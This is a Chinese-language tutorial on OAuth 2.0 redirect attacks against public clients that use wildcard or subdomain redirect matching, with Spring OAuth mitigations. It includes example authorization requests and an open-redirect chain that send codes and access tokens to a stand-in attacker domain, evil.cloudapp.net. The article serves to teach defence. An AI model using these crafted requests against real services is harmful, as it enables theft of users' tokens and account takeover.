## 一、简介

OAuth 是委托授权的行业标准框架。在创建构成标准的各种流程时，已经投入了大量的思考和精力。即便如此，它也并非没有漏洞。

在本系列文章中，我们将从理论的角度讨论针对 OAuth 的攻击，并描述可用于保护我们的应用程序的各种选项。

## 2.授权码授予

授权[代码授予](https://oauth.net/2/grant-types/authorization-code/)流程是大多数实现委派授权的应用程序使用的默认流程。

在该流程开始之前，Client 必须预先注册到 Authorization Server，并且在此过程中，它还必须提供重定向 URL——即**Authorization Server 可以通过 Authorization 回调到 Client 的 URL代码。**

让我们仔细看看它是如何工作的以及其中一些术语的含义。

在授权代码授予流程中，客户端（请求委派授权的应用程序）将资源所有者（用户）重定向到授权服务器（例如[Login with Google](https://developers.google.com/identity/sign-in/web/sign-in)）。登录后，授权服务器**使用授权码重定向回客户端。**

接下来，客户端调用授权服务器的端点，通过提供授权代码来请求访问令牌。至此，流程结束，客户端可以使用token访问Authorization Server保护的资源。

现在，**OAuth 2.0 Framework 允许这些 Clients 公开\*，\***比如在 Client 不能安全地持有 Client Secret 的情况下。让我们看一下可能针对公共客户端的一些重定向攻击。

## 3.重定向攻击

### 3.1. 攻击前提

重定向攻击依赖于**OAuth 标准没有完全描述必须指定此重定向 URL 的范围这一事实。** 这是设计使然。

**这允许 OAuth 协议的某些实现允许部分重定向 URL。**

例如，如果我们使用以下基于通配符的匹配项与授权服务器注册客户端 ID 和客户端重定向 URL：

**.cloudapp.net*

这将适用于：

*app.cloudapp.net*

也适用于：

*evil.cloudapp.net*

我们特意选择了*cloudapp.net域，因为这是我们可以托管 OAuth 支持的应用程序的真实位置。*[该域是微软 Windows Azure 平台](https://docs.microsoft.com/en-us/archive/blogs/ptsblog/security-consideration-when-using-cloudapp-net-domain-as-production-environment-in-windows-azure)的一部分，允许任何开发人员在其下托管子域以测试应用程序。这本身不是问题，但它是更大利用的重要组成部分。

此漏洞利用的第二部分是授权服务器，它允许在回调 URL 上进行通配符匹配。

最后，为了实现这个漏洞利用，应用程序开发者需要向授权服务器注册以接受主域下的任何 URL，形式为**.cloudapp.net*。

### 3.2. 攻击

当满足这些条件时，攻击者需要诱骗用户从他控制的子域启动页面，例如，向[用户发送一封看似真实的电子邮件](https://www.vadesecure.com/en/5-common-phishing-techniques/)，要求他对受 OAuth 保护的帐户采取一些行动。通常，这看起来像*https://evil.cloudapp.net/login*。当用户打开此链接并选择登录时，他将被重定向到带有授权请求的授权服务器：

```java
GET /authorize?response_type=code&client_id={apps-client-id}&state={state}&redirect_uri=https%3A%2F%2Fevil.cloudapp.net%2Fcb HTTP/1.1复制
```

虽然这看起来很正常，但这个 URL 是恶意的。看，在这种情况下，授权服务器**收到一个篡改的 URL，其中包含\*应用程序的\*客户端 ID**和一个指向回*恶意*应用程序的重定向 URL。

然后，授权服务器将验证 URL，该 URL 是指定主域下的子域。由于授权服务器认为请求来自有效来源，因此它将对用户进行身份验证，然后像往常一样征求同意。

完成后，它现在将重定向回*evil.cloudapp.net*子域，将授权码交给攻击者。

由于攻击者现在有了授权码，他需要做的就是用授权码调用授权服务器的令牌端点来接收令牌，这允许他访问资源所有者的受保护资源。

## 4. Spring OAuth授权服务器漏洞评估

让我们看一个简单的 Spring OAuth 授权服务器配置：

```java
@Configuration
public class AuthorizationServerConfig extends AuthorizationServerConfigurerAdapter {    
    @Override
    public void configure(ClientDetailsServiceConfigurer clients) throws Exception {
        clients.inMemory()
          .withClient("apricot-client-id")
          .authorizedGrantTypes("authorization_code")
          .scopes("scope1", "scope2")
          .redirectUris("https://app.cloudapp.net/oauth");
    }
    // ...
}复制
```

我们可以在这里看到授权服务器正在配置一个 ID 为*“apricot-client-id”*的新客户端。没有客户端密码，所以这是一个公共客户端。

**我们的安全耳朵应该对此振作起来**，因为我们现在拥有三个条件中的两个 - 邪恶的人可以注册子域*并且*我们正在使用公共客户端。

但是，请注意，我们**也在此处配置重定向 URL，并且它是 absolute**。我们可以通过这样做来减轻漏洞。

### 4.1. 严格的

默认情况下，Spring OAuth 在重定向 URL 匹配方面允许一定程度的灵活性。

例如， *DefaultRedirectResolver* 支持子域匹配。

**让我们只使用我们需要的东西。**如果我们可以恰好匹配重定向 URL，我们应该这样做：

```java
@Configuration
public class AuthorizationServerConfig extends AuthorizationServerConfigurerAdapter {    
    //...

    @Override
    public void configure(AuthorizationServerEndpointsConfigurer endpoints) {
        endpoints.redirectResolver(new ExactMatchRedirectResolver());
    }
}复制
```

在这种情况下，我们已切换到使用*ExactMatchRedirectResolver*重定向 URL。此解析器执行精确的字符串匹配，而不以任何方式解析重定向 URL。**这使得它的行为更加安全和确定。**

### 4.2. 宽容

[我们可以在Spring Security OAuth source](https://github.com/spring-projects/spring-security-oauth/blob/7bfe08d8f95b2fec035de484068f7907851b27d0/spring-security-oauth2/src/main/java/org/springframework/security/oauth2/provider/endpoint/DefaultRedirectResolver.java)中找到处理重定向 URL 匹配的默认代码：

```java
/**
Whether the requested redirect URI "matches" the specified redirect URI. For a URL, this implementation tests if
the user requested redirect starts with the registered redirect, so it would have the same host and root path if
it is an HTTP URL. The port, userinfo, query params also matched. Request redirect uri path can include
additional parameters which are ignored for the match
<p>
For other (non-URL) cases, such as for some implicit clients, the redirect_uri must be an exact match.
@param requestedRedirect The requested redirect URI.
@param redirectUri The registered redirect URI.
@return Whether the requested redirect URI "matches" the specified redirect URI.
*/
protected boolean redirectMatches(String requestedRedirect, String redirectUri) {
   UriComponents requestedRedirectUri = UriComponentsBuilder.fromUriString(requestedRedirect).build();
   UriComponents registeredRedirectUri = UriComponentsBuilder.fromUriString(redirectUri).build();
   boolean schemeMatch = isEqual(registeredRedirectUri.getScheme(), requestedRedirectUri.getScheme());
   boolean userInfoMatch = isEqual(registeredRedirectUri.getUserInfo(), requestedRedirectUri.getUserInfo());
   boolean hostMatch = hostMatches(registeredRedirectUri.getHost(), requestedRedirectUri.getHost());
   boolean portMatch = matchPorts ? registeredRedirectUri.getPort() == requestedRedirectUri.getPort() : true;
   boolean pathMatch = isEqual(registeredRedirectUri.getPath(),
     StringUtils.cleanPath(requestedRedirectUri.getPath()));
   boolean queryParamMatch = matchQueryParams(registeredRedirectUri.getQueryParams(),
     requestedRedirectUri.getQueryParams());

   return schemeMatch && userInfoMatch && hostMatch && portMatch && pathMatch && queryParamMatch;
}复制
```

我们可以看到，URL 匹配是通过将传入的重定向 URL 解析为其组成部分来完成的。由于它的几个特性，这非常复杂，**比如端口、子域和查询参数是否应该匹配。** 选择允许子域匹配是需要三思的。

当然，这种灵活性是存在的，如果我们需要的话——让我们谨慎使用它。

## 5.隐式流量重定向攻击

**需要明确的是，[不推荐](https://tools.ietf.org/html/rfc8252#section-8.2)[使用隐式流](https://oauth.net/2/grant-types/implicit/) 。**最好使用具有[PKCE](https://tools.ietf.org/html/rfc7636)提供的附加安全性的授权代码授予流程。也就是说，让我们看一下重定向攻击如何通过隐式流表现出来。

针对隐式流的重定向攻击将遵循与我们在上面看到的相同的基本轮廓。主要区别在于攻击者会立即获得令牌，因为没有授权代码交换步骤。

和以前一样，重定向 URL 的绝对匹配也将减轻此类攻击。

此外，我们可以发现隐式流包含另一个相关漏洞。**攻击者可以将客户端用作开放式重定向器并让它重新附加片段**。

攻击像以前一样开始，攻击者让用户访问受攻击者控制的页面，例如*https://evil.cloudapp.net/info*。该页面被设计为像以前一样发起授权请求。但是，它现在包含一个重定向 URL：

```java
GET /authorize?response_type=token&client_id=ABCD&state=xyz&redirect_uri=https%3A%2F%2Fapp.cloudapp.net%2Fcb%26redirect_to
%253Dhttps%253A%252F%252Fevil.cloudapp.net%252Fcb HTTP/1.1
复制
```

redirect_to *https://evil.cloudapp.net*正在设置授权端点以将令牌重定向到攻击者控制下的域。授权服务器现在将首先重定向到实际的应用程序站点：

```java
Location: https://app.cloudapp.net/cb?redirect_to%3Dhttps%3A%2F%2Fevil.cloudapp.net%2Fcb#access_token=LdKgJIfEWR34aslkf&...
复制
```

当此请求到达打开的重定向器时，它将提取重定向 URL *evil.cloudapp.net*，然后重定向到攻击者的站点：

```java
https://evil.cloudapp.net/cb#access_token=LdKgJIfEWR34aslkf&...
复制
```

绝对 URL 匹配也将减轻这种攻击。

## 6.总结

在本文中，我们讨论了一类基于重定向 URL 的针对 OAuth 协议的攻击。

虽然这可能会造成严重后果，但在授权服务器上使用绝对 URL 匹配可以减轻此类攻击。